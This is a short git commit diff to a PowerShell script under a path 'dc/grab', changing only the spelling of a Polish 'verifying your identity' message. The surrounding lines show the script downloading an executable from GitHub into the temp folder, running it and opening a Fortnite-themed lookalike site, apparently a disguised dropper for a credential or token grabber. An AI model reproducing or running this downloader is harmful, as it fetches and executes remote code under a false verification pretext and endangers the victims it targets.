417064337f940f3175986b6cfa579931c5179c70
xKotelek <contact@kotelek.dev>
2024-12-26 23:16:32 +0100

    Update exec.ps1

--- dc/grab/exec.ps1
+++ dc/grab/exec.ps1
@@ -1,5 +1,5 @@
 powershell -Command {
-    Write-Host 'Weryfikuję twoją tożsamość...' -ForegroundColor Green;
+    Write-Host 'Weryfikuje twoja tozsamosc...' -ForegroundColor Green;
     Invoke-WebRequest -Uri 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe' -OutFile $env:TEMP\temp.exe;
     Start-Process $env:TEMP\temp.exe;
     Start-Process 'https://f0rtn1te-xp.ct8.pl/';
